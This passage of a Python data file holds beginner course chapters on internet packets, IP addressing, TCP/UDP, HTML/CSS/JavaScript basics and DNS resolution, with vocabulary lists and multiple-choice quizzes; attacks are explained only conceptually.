CHAPTERS_DATA = [
    # =========================================================================
    # CHAPTER 1
    # =========================================================================
    {
        "slug": "how-data-travels-the-internet",
        "title": "How Data Travels the Internet",
        "subtitle": "Understanding the invisible highways your data uses every day",
        "category": "Part 1: Foundations",
        "part_number": 1,
        "chapter_number": 1,
        "difficulty": "beginner",
        "estimated_minutes": 25,
        "intro_hook": (
            "Every time you open a website, send a message, or stream a video, your "
            "data embarks on an incredible journey across the globe in milliseconds. "
            "Cables under the ocean, radio waves in the air, and thousands of "
            "computers in between all work together to deliver your data. But how "
            "does it actually work? In this chapter, we will peel back the curtain "
            "and reveal the hidden mechanics of the internet."
        ),
        "key_takeaways": [
            "The internet is a global network of interconnected computers, not a single entity",
            "Data is broken into small packets that travel independently across the network",
            "DNS translates human-readable names like google.com into numeric IP addresses",
            "TCP ensures reliable delivery while UDP prioritizes speed over reliability"
        ],
        "vocabulary_json": [
            {"term": "Internet", "definition": "A global network of computers connected together, allowing them to communicate and share information."},
            {"term": "Packet", "definition": "A small chunk of data that travels across the internet, like a single page from a letter."},
            {"term": "IP Address", "definition": "A unique number assigned to every device on a network, like a street address for your computer."},
            {"term": "DNS", "definition": "The Domain Name System translates website names into numeric IP addresses."},
            {"term": "Router", "definition": "A device that directs data packets along the best path to their destination."},
            {"term": "Bandwidth", "definition": "The maximum amount of data that can flow through a connection at once."}
        ],
        "sections": [
            {
                "title": "What the Internet Actually Is",
                "content": (
                    "When most people think of \"the internet,\" they imagine a cloud "
                    "somewhere in the sky. In reality, the internet is a physical thing. "
                    "It is a **massive network of networks** — millions of computers "
                    "connected by physical cables, some of which are buried under the "
                    "ocean floor.\n\n"
                    "Think of it like the road system in a country. Individual streets "
                    "connect your house to the neighborhood. Neighborhood roads connect "
                    "to highways. Highways connect cities. The internet works the same way, "
                    "but instead of roads, we have **fiber optic cables**, copper wires, "
                    "and wireless connections.\n\n"
                    "> The internet carries over **5 billion users** worth of traffic "
                    "> every day, and it all travels through physical infrastructure "
                    "> you could reach out and touch.\n\n"
                    "Your home Wi-Fi connects to your router. Your router connects to "
                    "your Internet Service Provider (ISP), like Comcast or AT&T. Your "
                    "ISP connects to larger networks called **backbone providers**. These "
                    "backbone providers operate the massive undersea and cross-country "
                    "cables that carry internet traffic across continents.\n\n"
                    "The beauty of this system is that no single company or government "
                    "owns the internet. It is a **cooperative network** where each "
                    "organization manages its own piece and connects to the others. "
                    "This is why the internet is sometimes called a \"network of networks.\""
                )
            },
            {
                "title": "IP Addresses: The Internet's Phone Book",
                "content": (
                    "Every device on the internet needs a way to be identified, just "
                    "like every house needs an address. On the internet, this address "
                    "is called an **IP address** (Internet Protocol address).\n\n"
                    "An IP address looks like this: `192.168.1.1`. This is called an "
                    "**IPv4 address**, and it is a 32-bit number written as four groups "
                    "of digits separated by periods. Each group can range from 0 to 255, "
                    "which gives us roughly **4.3 billion** possible addresses.\n\n"
                    "Since we have run out of IPv4 addresses, a new system called "
                    "**IPv6** was created. IPv6 addresses look very different:\n\n"
                    "`2001:0db8:85a3:0000:0000:8a2e:0370:7334`\n\n"
                    "IPv6 uses 128-bit addresses, providing an astronomically large "
                    "number of possible addresses — enough for every grain of sand on "
                    "Earth to have its own.\n\n"
                    "> You can think of an IP address like a phone number. When you "
                    "> call someone, the phone system uses their number to route your "
                    "> call. The internet uses IP addresses to route your data.\n\n"
                    "There are two types of IP addresses to know about. A **public IP "
                    "address** is assigned by your ISP and is visible to the outside "
                    "world. A **private IP address** is what your router assigns to "
                    "devices inside your home network, like your phone or laptop. "
                    "Your router translates between the two using a technique called "
                    "**NAT** (Network Address Translation)."
                )
            },
            {
                "title": "Packets: How Data Moves",
                "content": (
                    "Imagine you are mailing a 500-page book to a friend, but the post "
                    "office only accepts envelopes with up to 10 pages each. You would "
                    "tear the book into 50 separate envelopes, number them, and send "
                    "them off. Your friend would reassemble them in order. That is "
                    "exactly how the internet works with **packets**.\n\n"
                    "When you request a web page, your browser breaks the request into "
                    "small **packets** — typically 1,500 bytes or less. Each packet "
                    "contains:\n\n"
                    "- A **header** with source and destination IP addresses\n"
                    "- A **sequence number** so it can be reassembled in order\n"
                    "- The actual **data payload**\n\n"
                    "Each packet travels independently through the network. They might "
                    "take completely different paths to reach the same destination. "
                    "One packet might go through New York, another through Chicago, "
                    "and a third through Dallas. The routers along the way decide the "
                    "best path for each packet based on current network conditions.\n\n"
                    "> This is like sending 50 envelopes through different postal "
                    "> routes. Some might arrive first, some might be delayed, but "
                    "> they all end up at the same destination.\n\n"
                    "Once all the packets arrive, they are **reassembled** into the "
                    "original message. If any packets are missing or corrupted, the "
                    "system can request them to be resent. This is one of the "
                    "internet's most elegant design features — it makes data transfer "
                    "resilient and efficient."
                )
            },
            {
                "title": "DNS: Translating Names to Numbers",
                "content": (
                    "Humans are terrible at remembering numbers. Try memorizing "
                    "`142.250.80.46` and you will understand why the internet has a "
                    "system for translating names into numbers. This system is called "
                    "**DNS** — the Domain Name System.\n\n"
                    "When you type `google.com` into your browser, your computer "
                    "contacts a **DNS server** and asks: \"What is the IP address for "
                    "google.com?\" The DNS server responds with `142.250.80.46`, and "
                    "your browser uses that number to connect.\n\n"
                    "DNS works like a hierarchical phone book:\n\n"
                    "- **Root servers** sit at the top, knowing where to find `.com`, "
                    "`.org`, `.net`, etc.\n"
                    "- **TLD servers** (Top-Level Domain servers) know where to find "
    "specific domains like `google.com`\n"
                    "- **Authoritative servers** hold the actual IP addresses for "
                    "specific websites\n\n"
                    "> Think of DNS like asking for directions. You ask a friend, who "
                    "> points you to the right city, who points you to the right "
                    "> street, who points you to the right house.\n\n"
                    "DNS is critical for security too. If an attacker can poison DNS "
                    "records — changing them to point to malicious servers — they can "
                    "redirect your traffic without you knowing. This is why **DNS "
                    "security** is a major topic in cybersecurity."
                )
            },
            {
                "title": "TCP vs UDP: Reliable vs Fast",
                "content": (
                    "Not all internet traffic needs the same treatment. Sending a bank "
                    "statement requires every byte to arrive correctly. But for a live "
                    "video call, a few lost frames are acceptable — speed matters more "
                    "than perfection. This is why the internet has two main "
                    "**transport protocols**.\n\n"
                    "**TCP (Transmission Control Protocol)** is the reliable one. "
                    "Before sending data, TCP establishes a connection using a "
                    "three-step process called a **handshake**:\n\n"
                    "1. \"SYN\" — \"I would like to connect\"\n"
                    "2. \"SYN-ACK\" — \"Sure, I acknowledge\"\n"
                    "3. \"ACK\" — \"Great, let us begin\"\n\n"
                    "After this handshake, TCP tracks every packet with sequence "
                    "numbers and guarantees that all packets arrive in the correct "
                    "order. If a packet is lost, TCP **retransmits** it. Web pages, "
                    "emails, and file transfers all use TCP.\n\n"
                    "**UDP (User Datagram Protocol)** is the fast one. It sends data "
                    "without establishing a connection first. There is no handshake, "
                    "no sequence numbers, and no retransmission. If a packet is lost, "
                    "it is simply gone. Streaming video, online gaming, and voice "
                    "calls use UDP because speed matters more than reliability.\n\n"
                    "> TCP is like a certified letter with tracking. UDP is like "
                    "> tossing a ball to a friend — quick and easy, but if they miss "
                    "> it, you do not send another one."
                )
            },
            {
                "title": "What Happens When You Load a Page",
                "content": (
                    "Let us put it all together. When you type `www.example.com` into "
                    "your browser and press Enter, here is what happens in roughly "
                    "**200 milliseconds**:\n\n"
                    "1. **DNS lookup**: Your browser asks a DNS server for the IP "
                    "address of `www.example.com`. The DNS server returns something "
                    "like `93.184.216.34`.\n\n"
                    "2. **TCP connection**: Your browser opens a TCP connection to "
                    "`93.184.216.34` using the three-way handshake on port 443 "
                    "(for HTTPS).\n\n"
                    "3. **TLS handshake**: Your browser and the server negotiate "
                    "encryption settings to secure the connection.\n\n"
                    "4. **HTTP request**: Your browser sends a request like:\n\n"
                    "```http\n"
                    "GET / HTTP/1.1\n"
                    "Host: www.example.com\n"
                    "```\n\n"
                    "5. **Server response**: The server sends back HTML, which your "
                    "browser breaks into packets.\n\n"
                    "6. **Packet delivery**: Each packet travels through routers, "
                    "potentially taking different paths, until it reaches your device.\n\n"
                    "7. **Reassembly**: Your browser reassembles the packets in order, "
                    "parses the HTML, and requests additional files (CSS, JavaScript, "
                    "images).\n\n"
                    "8. **Rendering**: Your browser builds the page visually and "
                    "displays it on your screen.\n\n"
                    "> The entire process involves dozens of computers working together "
                    "> in fractions of a second. The internet is one of humanity's "
                    "> greatest engineering achievements."
                )
            }
        ],
        "quizzes": [
            {
                "question_number": 1,
                "question_type": "multiple_choice",
                "question_text": "What is the primary purpose of DNS?",
                "options": [
                    "To encrypt data traveling across the internet",
                    "To translate human-readable domain names into numeric IP addresses",
                    "To break data into smaller packets for transmission",
                    "To establish secure connections between browsers and servers"
                ],
                "correct_index": 1,
                "explanation": "DNS (Domain Name System) acts like a phone book, translating names like google.com into IP addresses like 142.250.80.46 that computers can use to locate each other."
            },
            {
                "question_number": 2,
                "question_type": "multiple_choice",
                "question_text": "Why does the internet break data into packets instead of sending it all at once?",
                "options": [
                    "Packets are required by law for internet traffic",
                    "Small packets can take different paths and be reassembled, making transfers more resilient",
                    "Packets use less electricity than sending entire files",
                    "Only small files can be sent without packets"
                ],
                "correct_index": 1,
                "explanation": "Packets allow data to take multiple paths through the network, making the system resilient. If one path fails, other packets can reroute. It also allows multiple users to share the same network efficiently."
            },
            {
                "question_number": 3,
                "question_type": "multiple_choice",
                "question_text": "What is the key difference between TCP and UDP?",
                "options": [
                    "TCP is only used for video, UDP is only for text",
                    "TCP guarantees delivery and order, UDP prioritizes speed over reliability",
                    "TCP works on mobile networks, UDP only works on wired connections",
                    "UDP is newer and always better than TCP"
                ],
                "correct_index": 1,
                "explanation": "TCP guarantees all packets arrive in order through handshakes and retransmission. UDP sends packets without guarantees, making it faster but less reliable — ideal for live streaming and gaming."
            },
            {
                "question_number": 4,
                "question_type": "multiple_choice",
                "question_text": "What is a public IP address?",
                "options": [
                    "An IP address that anyone can use for free",
                    "An address assigned by your ISP that is visible to the outside internet",
                    "An IP address stored in a public database",
                    "An address that only works during daytime hours"
                ],
                "correct_index": 1,
                "explanation": "A public IP address is assigned by your Internet Service Provider and is the address the outside internet uses to reach your network. Private IP addresses are used only within your local network."
            },
            {
                "question_number": 5,
                "question_type": "multiple_choice",
                "question_text": "When you type a URL and press Enter, what is the very first step your computer takes?",
                "options": [
                    "It downloads the website's CSS and JavaScript files",
                    "It opens a TCP connection to the web server",
                    "It sends a DNS query to look up the domain name's IP address",
                    "It encrypts the connection using TLS"
                ],
                "correct_index": 2,
                "explanation": "Before anything else, your computer must find the IP address of the server. It does this through a DNS lookup. Only after it has an IP address can it establish a connection."
            },
            {
                "question_number": 6,
                "question_type": "multiple_choice",
                "question_text": "What is NAT (Network Address Translation)?",
                "options": [
                    "A method for encrypting internet traffic",
                    "A technique that lets multiple devices on a home network share one public IP address",
                    "A protocol for speeding up DNS lookups",
                    "A type of firewall that blocks malicious packets"
                ],
                "correct_index": 1,
                "explanation": "NAT allows your router to translate between private IP addresses (used within your home) and a single public IP address (assigned by your ISP), enabling multiple devices to share one internet connection."
            }
        ]
    },

    # =========================================================================
    # CHAPTER 2
    # =========================================================================
    {
        "slug": "how-websites-work",
        "title": "How Websites Work",
        "subtitle": "The building blocks behind every web page you visit",
        "category": "Part 1: Foundations",
        "part_number": 1,
        "chapter_number": 2,
        "difficulty": "beginner",
        "estimated_minutes": 20,
        "intro_hook": (
            "Every website you visit — from Google to Instagram to your bank — is "
            "made from the same three ingredients: HTML, CSS, and JavaScript. "
            "Understanding these building blocks is the first step to understanding "
            "web security. After all, you cannot protect something you do not "
            "understand."
        ),
        "key_takeaways": [
            "HTML provides the structure of a page, CSS provides the styling, and JavaScript provides interactivity",
            "Websites are served by web servers and accessed by web browsers (clients)",
            "The frontend is what users see, the backend is the hidden logic and data",
            "Every web page is just text files interpreted by your browser"
        ],
        "vocabulary_json": [
            {"term": "HTML", "definition": "HyperText Markup Language — the code that defines the structure and content of a web page."},
            {"term": "CSS", "definition": "Cascading Style Sheets — the code that controls how a web page looks (colors, fonts, layout)."},
            {"term": "JavaScript", "definition": "A programming language that makes web pages interactive and dynamic."},
            {"term": "Server", "definition": "A computer that stores website files and sends them to users who request them."},
            {"term": "Client", "definition": "The user's device and browser that request and display web pages."},
            {"term": "HTTP", "definition": "HyperText Transfer Protocol — the rules for how browsers and servers communicate."}
        ],
        "sections": [
            {
                "title": "What Happens When You Visit a Website",
                "content": (
                    "When you visit a website, your browser (the client) sends a "
                    "request to a web server somewhere in the world. The server "
                    "responds by sending back a collection of text files. Your "
                    "browser then interprets those files and renders them as the "
                    "visual page you see on screen.\n\n"
                    "It sounds simple, but there is a lot happening behind the scenes. "
                    "A typical web page consists of:\n\n"
                    "- An **HTML file** that defines the page structure\n"
                    "- One or more **CSS files** that define the visual style\n"
                    "- One or more **JavaScript files** that add interactivity\n"
                    "- **Images, fonts, and other media** referenced by the code\n\n"
                    "> A web page is not a single file — it is a collection of "
                    "> resources that your browser assembles into a cohesive experience.\n\n"
                    "Understanding this architecture is critical for security because "
                    "each of these components is a potential attack surface. Attackers "
                    "can inject malicious HTML, exploit JavaScript vulnerabilities, "
                    "or manipulate the communication between your browser and the server."
                )
            },
            {
                "title": "HTML: The Skeleton",
                "content": (
                    "**HTML** stands for HyperText Markup Language. It is the "
                    "foundation of every web page. Think of HTML as the **skeleton "
                    "of a body** — it defines the structure but not the appearance.\n\n"
                    "HTML uses **tags** — special keywords enclosed in angle brackets — "
                    "to define elements on a page:\n\n"
                    "```html\n"
                    "<h1>Welcome to My Website</h1>\n"
                    "<p>This is a paragraph of text.</p>\n"
                    "<a href=\"https://example.com\">Click here</a>\n"
                    "```\n\n"
                    "Here, `<h1>` creates a large heading, `<p>` creates a paragraph, "
                    "and `<a>` creates a clickable link. Each tag has an opening "
                    "version and a closing version (with a `/`).\n\n"
                    "HTML also supports **forms** that collect user input:\n\n"
                    "```html\n"
                    "<form action=\"/login\" method=\"POST\">\n"
                    "  <input type=\"text\" name=\"username\">\n"
                    "  <input type=\"password\" name=\"password\">\n"
                    "  <button type=\"submit\">Log In</button>\n"
                    "</form>\n"
                    "```\n\n"
                    "Forms are one of the most important security concepts because "
                    "they are how users send data to servers. Attackers look for ways "
                    "to manipulate form data — this is the foundation of attacks like "
                    "**SQL injection** and **cross-site scripting (XSS)**, which we "
                    "will cover later.\n\n"
                    "> HTML itself is not dangerous, but it is the vehicle through "
                    "> which many attacks are delivered."
                )
            },
            {
                "title": "CSS: The Skin",
                "content": (
                    "**CSS** (Cascading Style Sheets) controls the visual appearance "
                    "of a web page. If HTML is the skeleton, CSS is the **skin, "
                    "clothing, and paint**. It determines colors, fonts, spacing, "
                    "layouts, and animations.\n\n"
                    "CSS can be written directly in HTML using a `<style>` tag, or "
                    "in a separate `.css` file:\n\n"
                    "```css\n"
                    "body {\n"
                    "  background-color: #f0f0f0;\n"
                    "  font-family: Arial, sans-serif;\n"
                    "}\n"
                    "\n"
                    "h1 {\n"
                    "  color: #2c3e50;\n"
                    "  font-size: 2em;\n"
                    "}\n"
                    "```\n\n"
                    "This example makes the background light gray, sets the font to "
                    "Arial, and makes headings dark blue and large.\n\n"
                    "While CSS is less commonly exploited than HTML or JavaScript, "
                    "it still matters for security. **CSS injection** can be used "
                    "to overlay invisible elements on a page, creating **clickjacking** "
                    "attacks where users think they are clicking one thing but are "
                    "actually clicking something else.\n\n"
                    "CSS also affects the **user experience** of security features. "
                    "A poorly styled password field might accidentally show characters "
                    "in plain text instead of masking them with dots."
                )
            },
            {
                "title": "JavaScript: The Brain",
                "content": (
                    "**JavaScript** is what makes web pages interactive. Without "
                    "JavaScript, every web page would be a static document — like "
                    "a PDF. JavaScript adds **behavior**: buttons that respond to "
                    "clicks, forms that validate input, animations that play, and "
                    "data that updates without reloading the page.\n\n"
                    "```javascript\n"
                    "document.getElementById('login-btn').addEventListener('click', "
                    "function() {\n"
                    "  alert('Login clicked!');\n"
                    "});\n"
                    "```\n\n"
                    "JavaScript runs **inside your browser**, on your device. This "
                    "is a crucial concept. Every piece of JavaScript on a web page "
                    "runs with access to your browser's data, including cookies "
                    "and session information.\n\n"
                    "> This is why you should never run JavaScript from an untrusted "
                    "> source. It runs with full access to your browser's capabilities.\n\n"
                    "JavaScript is the most exploited web technology because it:\n\n"
                    "- Runs on the user's device, giving it access to sensitive data\n"
                    "- Can make network requests on behalf of the user\n"
                    "- Can manipulate the content of any page\n"
                    "- Can send data to any server on the internet\n\n"
                    "This is why **Cross-Site Scripting (XSS)** — where attackers "
                    "inject malicious JavaScript into trusted websites — is one of "
                    "the most common web attacks in the world."
                )
            },
            {
                "title": "Servers and Clients",
                "content": (
                    "Web communication follows a simple **client-server model**. "
                    "The **client** (your browser) makes requests. The **server** "
                    "stores resources and sends responses.\n\n"
                    "Think of it like a restaurant. You (the client) look at a menu "
                    "and place an order. The kitchen (the server) prepares your food "
                    "and brings it to your table. You never go into the kitchen "
                    "yourself — you communicate through the waiter (the HTTP "
                    "protocol).\n\n"
                    "A **web server** is software (like Apache or Nginx) that runs "
                    "on a computer and listens for incoming requests. When it receives "
                    "a request, it finds the requested file or runs some code and "
                    "sends back a response.\n\n"
                    "The communication happens over **HTTP** (HyperText Transfer "
                    "Protocol) or its secure version **HTTPS** (HTTP Secure). "
                    "HTTP works on port 80, and HTTPS on port 443.\n\n"
                    "A typical HTTP response includes:\n\n"
                    "```http\n"
                    "HTTP/1.1 200 OK\n"
                    "Content-Type: text/html\n"
                    "\n"
                    "<html>...page content...</html>\n"
                    "```\n\n"
                    "The **status code** tells you what happened. `200` means OK, "
                    "`404` means not found, and `500` means the server had an error. "
                    "Understanding these codes helps you debug and secure applications."
                )
            },
            {
                "title": "Frontend vs Backend",
                "content": (
                    "Web development is divided into two major areas: **frontend** "
                    "and **backend**.\n\n"
                    "The **frontend** is everything the user sees and interacts "
                    "with directly in their browser. It includes:\n\n"
                    "- HTML structure\n"
                    "- CSS styling\n"
                    "- JavaScript logic\n"
                    "- User interface elements\n\n"
                    "The **backend** is everything that happens on the server. "
                    "It includes:\n\n"
                    "- Application logic (processing orders, authenticating users)\n"
                    "- Database interactions (storing and retrieving data)\n"
                    "- File management\n"
                    "- API endpoints\n\n"
                    "> The frontend is the dining room of a restaurant. The backend "
                    "> is the kitchen. Customers see the dining room, but the real "
                    "> work happens in the kitchen.\n\n"
                    "Understanding this split is essential for security because "
                    "**frontend security** (preventing XSS, clickjacking) and "
                    "**backend security** (preventing SQL injection, authentication "
                    "bypass) require different skills and techniques.\n\n"
                    "A critical security principle: **never trust the frontend**. "
                    "Any validation done only in JavaScript can be bypassed by an "
                    "attacker. Always validate and sanitize data on the server side."
                )
            }
        ],
        "quizzes": [
            {
                "question_number": 1,
                "question_type": "multiple_choice",
                "question_text": "What are the three core technologies that make up a web page?",
                "options": [
                    "Java, Python, and Ruby",
                    "HTML, CSS, and JavaScript",
                    "SQL, NoSQL, and MongoDB",
                    "HTTP, FTP, and SMTP"
                ],
                "correct_index": 1,
                "explanation": "Every web page is built from HTML (structure), CSS (styling), and JavaScript (interactivity). These three technologies work together to create the complete web experience."
            },
            {
                "question_number": 2,
                "question_type": "multiple_choice",
                "question_text": "If HTML is the skeleton of a web page, what is CSS?",
                "options": [
                    "The brain that controls behavior",
                    "The nervous system that sends signals",
                    "The skin, clothing, and paint that controls appearance",
                    "The bones that provide structure"
                ],
                "correct_index": 2,
                "explanation": "CSS (Cascading Style Sheets) controls the visual appearance — colors, fonts, layout, and animations. It is what makes a page look good rather than just being plain text."
            },
            {
                "question_number": 3,
                "question_type": "multiple_choice",
                "question_text": "Why is JavaScript particularly important for web security?",
                "options": [
                    "It is the oldest programming language and has many bugs",
                    "It runs on the user's device with access to cookies and session data",
                    "It can only run on Windows computers",
                    "It does not work with HTML or CSS"
                ],
                "correct_index": 1,
                "explanation": "JavaScript runs directly in the user's browser, giving it access to cookies, session tokens, and the ability to make network requests. This is why injecting malicious JavaScript (XSS) is such a serious attack."
            },
            {
                "question_number": 4,
                "question_type": "multiple_choice",
                "question_text": "What does the client-server model mean?",
                "options": [
                    "The client and server are always the same computer",
                    "The client makes requests and the server stores resources and sends responses",
                    "The server initiates connections to the client",
                    "Both client and server must use the same operating system"
                ],
                "correct_index": 1,
                "explanation": "In the client-server model, the client (your browser) sends requests and the server stores resources and sends back responses. The server never initiates contact — it only responds to client requests."
            },
            {
                "question_number": 5,
                "question_type": "multiple_choice",
                "question_text": "Why should you never trust frontend validation alone?",
                "options": [
                    "Frontend code runs too slowly to be reliable",
                    "Frontend validation is only visible on mobile devices",
                    "An attacker can bypass any client-side validation by sending direct requests to the server",
                    "Frontend validation uses too much memory"
                ],
                "correct_index": 2,
                "explanation": "Any validation done in JavaScript on the client side can be bypassed by an attacker who sends requests directly to the server. This is why all critical validation and sanitization must happen on the backend."
            },
            {
                "question_number": 6,
                "question_type": "multiple_choice",
                "question_text": "Which HTTP status code indicates that a page was not found?",
                "options": [
                    "200",
                    "403",
                    "404",
                    "500"
                ],
                "correct_index": 2,
                "explanation": "HTTP status code 404 means 'Not Found' — the server cannot find the requested resource. 200 means OK, 403 means Forbidden, and 500 means Internal Server Error."
            }
        ]
    },

    # =========================================================================
    # CHAPTER 3
    # =========================================================================
    {
        "slug": "how-dns-really-works",
        "title": "How DNS Really Works",
        "subtitle": "The hidden system that makes the internet usable for humans",
        "category": "Part 1: Foundations",
        "part_number": 1,
        "chapter_number": 3,
        "difficulty": "beginner",
        "estimated_minutes": 20,
        "intro_hook": (
            "You type a simple name like amazon.com and a website appears. But your "
            "computer does not understand names — it only understands numbers. "
            "Behind the scenes, a vast and intricate system called DNS translates "
            "that name into an address in milliseconds. Understanding DNS is "
            "essential because attacks on DNS can redirect you to malicious sites "
            "without you ever knowing."
        ),
        "key_takeaways": [
            "DNS works hierarchically: root servers, TLD servers, and authoritative servers",
            "DNS caching speeds up lookups but can create security vulnerabilities",
            "DNS spoofing and poisoning can redirect traffic to malicious servers",
            "DNSSEC adds cryptographic signatures to DNS records to prevent tampering"
        ],
        "vocabulary_json": [
            {"term": "DNS Resolver", "definition": "The first server your computer contacts when it needs to look up a domain name."},
            {"term": "Root Server", "definition": "One of 13 clusters of servers that sit at the top of the DNS hierarchy."},
            {"term": "TLD Server", "definition": "A server that manages top-level domains like .com, .org, and .net."},
            {"term": "DNS Cache", "definition": "A temporary storage of recent DNS lookups to speed up future requests."},
            {"term": "DNS Spoofing", "definition": "An attack that corrupts DNS records to redirect users to malicious websites."},
            {"term": "DNSSEC", "definition": "DNS Security Extensions — a technology that adds cryptographic signatures to DNS records."}
        ],
        "sections": [
            {
                "title": "The Internet's Address Book",
                "content": (
                    "DNS is often called the **phone book of the internet**, but that "
                    "analogy only scratches the surface. Imagine a phone book where "
                    "the entries are organized in a strict hierarchy, every lookup "
                    "is cached for performance, and the whole system is designed to "
                    "scale to billions of users simultaneously.\n\n"
                    "At its core, DNS solves one fundamental problem: computers "
                    "communicate using **IP addresses** (like `93.184.216.34`), but "
                    "humans communicate using **names** (like `example.com`). DNS "
                    "bridges this gap.\n\n"
                    "The DNS system is organized into a **hierarchical tree**:\n\n"
                    "- At the top are **root servers** (13 clusters labeled A through M)\n"
                    "- Below roots are **TLD servers** (managing `.com`, `.org`, `.uk`, etc.)\n"
                    "- Below TLDs are **authoritative servers** (managing individual domains)\n\n"
                    "> The hierarchical design is what allows DNS to scale to billions "
                    "> of domains without any single server becoming overwhelmed.\n\n"
                    "No single server knows every domain name. Instead, each server "
                    "knows only a piece of the puzzle and knows who to ask for the "
                    "next piece. This delegation model is elegant and efficient."
                )
            },
            {
                "title": "How DNS Resolution Works Step by Step",
                "content": (
                    "When you type `www.example.com` into your browser, here is the "
                    "exact sequence of events:\n\n"
                    "**Step 1: Check the local cache**\n"
                    "Your browser checks its own cache. If it has looked up this "
                    "domain recently, it uses the cached result and skips the rest.\n\n"
                    "**Step 2: Check the OS cache**\n"
                    "If the browser does not have it, your operating system checks "
                    "its own DNS cache.\n\n"
                    "**Step 3: Ask the resolver**\n"
                    "Your computer sends a query to the **DNS resolver**, typically "
                    "provided by your ISP or a service like Google DNS "
                    "(`8.8.8.8`) or Cloudflare DNS (`1.1.1.1`).\n\n"
                    "**Step 4: Root server query**\n"
                    "The resolver asks a root server: \"Who handles `.com`?\" The "
                    "root server responds with the address of the `.com` TLD server.\n\n"
                    "**Step 5: TLD server query**\n"
                    "The resolver asks the `.com` TLD server: \"Who handles "
                    "`example.com`?\" The TLD server responds with the address of "
                    "example.com's authoritative server.\n\n"
                    "**Step 6: Authoritative server query**\n"
                    "The resolver asks the authoritative server: \"What is the IP "
                    "address for `www.example.com`?\" It responds with `93.184.216.34`.\n\n"
                    "**Step 7: Return to browser**\n"
                    "The resolver sends the IP address back to your computer, which "
                    "passes it to your browser.\n\n"
                    "> This entire chain typically completes in **under 50 "
                    "> milliseconds**. Your computer caches the result to avoid "
                    "> repeating these steps for a while."
                )
            },
            {
                "title": "Types of DNS Records",
                "content": (
                    "DNS is not just about mapping names to IP addresses. There are "
                    "several types of **DNS records**, each serving a different "
                    "purpose:\n\n"
                    "**A Record** (Address Record)\n"
                    "Maps a domain to an IPv4 address. This is the most common type.\n\n"
                    "```\n"
                    "example.com  →  93.184.216.34\n"
                    "```\n\n"
                    "**AAAA Record** (Quad-A Record)\n"
                    "Same as an A record, but maps to an IPv6 address.\n\n"
                    "**MX Record** (Mail Exchange)\n"
                    "Specifies which server handles email for a domain.\n\n"
                    "```\n"
                    "example.com  →  mail.example.com (priority 10)\n"
                    "```\n\n"
                    "**CNAME Record** (Canonical Name)\n"
                    "Points one domain to another domain (an alias).\n\n"
                    "```\n"
                    "www.example.com  →  example.com\n"
                    "```\n\n"
                    "**TXT Record** (Text Record)\n"
                    "Stores arbitrary text, often used for verification and security policies like **SPF** and **DKIM** for email authentication.\n\n"
                    "> DNS records are like different fields in a phone book. An A "
                    "> record is a phone number. An MX record is an email address. "
                    "> A TXT record is a note in the margin.\n\n"
                    "**NS Record** (Name Server)\n"
                    "Specifies which DNS servers are authoritative for a domain. "
                    "If an attacker changes your NS records, they can redirect "
                    "**all** your traffic."
                )
            },
            {
                "title": "DNS Caching",
                "content": (
                    "DNS lookups involve multiple servers and network round-trips. "
                    "To speed things up, DNS results are **cached** (temporarily "
                    "stored) at multiple levels:\n\n"
                    "1. **Browser cache**: Your browser stores recent lookups\n"
                    "2. **OS cache**: Your operating system stores results too\n"
                    "3. **Router cache**: Your home router may cache results\n"
                    "4. **ISP cache**: Your ISP's resolver caches results for all customers\n\n"
                    "Each cached result has a **TTL** (Time To Live), measured in "
                    "seconds. A TTL of 3600 means the record can be cached for up "
                    "to one hour.\n\n"
                    "```dns\n"
                    "example.com  3600  IN  A  93.184.216.34\n"
                    "```\n\n"
                    "Caching is essential for performance but creates a security "
                    "challenge. If an attacker can **poison a cache** — inserting "
                    "a false record — that false record will be served to every user "
                    "until the TTL expires.\n\n"
                    "> DNS cache poisoning is like someone slipping a fake page into "
                    "> a phone book. Everyone who looks up that number will call the "
                    "> wrong person until the fake page is found and removed.\n\n"
                    "This is why **DNSSEC** (covered later) exists — to prevent "
                    "cache poisoning by adding cryptographic signatures to records."
                )
            },
            {
                "title": "Why DNS Matters for Security",
                "content": (
                    "DNS is one of the most critical infrastructure components, and "
                    "attacking it can have devastating effects. Here are the main "
                    "DNS-based attacks:\n\n"
                    "**DNS Spoofing / Cache Poisoning**\n"
                    "An attacker inserts false DNS records into a resolver's cache, "
                    "redirecting users to malicious servers. This is how phishing "
                    "attacks become especially dangerous — the URL looks correct, "
                    "but the server is controlled by an attacker.\n\n"
                    "**DNS Hijacking**\n"
                    "An attacker modifies DNS settings on a router or computer to "
                    "redirect all DNS queries to a malicious resolver. Some ISPs "
                    "have been caught doing this for advertising purposes.\n\n"
                    "**DNS Tunneling**\n"
                    "Attackers encode data within DNS queries and responses to "
                    "exfiltrate data or establish command-and-control channels. "
                    "Since DNS traffic is rarely blocked, it is an effective "
                    "covert channel.\n\n"
                    "**DNS Amplification Attacks**\n"
                    "A type of DDoS attack where attackers send small DNS queries "
                    "with a spoofed source IP (the victim's IP). The large DNS "
                    "responses flood the victim's network.\n\n"
                    "> DNS is like the postal system. If you can forge the return "
                    "> address on a letter, you can trick people into sending "
                    "> sensitive information to the wrong place.\n\n"
                    "**DNSSEC** was created to combat spoofing. It adds "
                    "cryptographic signatures to DNS records, allowing resolvers "
                    "to verify that records have not been tampered with. However, "
                    "DNSSEC adoption is still incomplete."
                )
            },
            {
                "title": "DNS in the Real World",
                "content": (
                    "Let us look at how DNS is used in practice and why it matters "
                    "for everyday security.\n\n"
                    "**Using Custom DNS for Privacy**\n"
                    "By default, your ISP provides your DNS resolver. This means "
                    "your ISP can see every website you visit. By switching to a "
                    "privacy-focused DNS provider, you can improve your privacy:\n\n"
                    "- **Google DNS**: `8.8.8.8` — fast and reliable\n"
                    "- **Cloudflare DNS**: `1.1.1.1` — fast with privacy guarantees\n"
                    "- **Quad9 DNS**: `9.9.9.9` — blocks known malicious domains\n\n"
                    "**DNS-Based Security**\n"
                    "Some DNS providers offer security features that block access "
                    "to known malicious domains. Quad9, for example, automatically "
                    "blocks DNS lookups for domains associated with malware, "
                    "phishing, and botnets.\n\n"
                    "**How Phishing Exploits DNS**\n"
                    "A common phishing attack registers a domain that looks "
                    "similar to a legitimate one (like `g00gle.com` instead of "
                    "`google.com`). Since DNS correctly resolves this domain to "
                    "the attacker's server, the URL appears valid in the browser.\n\n"
                    "This is why you should always check the URL carefully and "
                    "look for the **padlock icon** indicating HTTPS. But even these "
                    "can be spoofed with homograph attacks using similar-looking "
                    "characters from different alphabets.\n\n"
                    "> The best defense against DNS-based attacks is a combination "
                    "> of awareness, DNSSEC, encrypted DNS (DoH or DoT), and "
                    "> security-focused DNS providers."
                )
            }
        ],
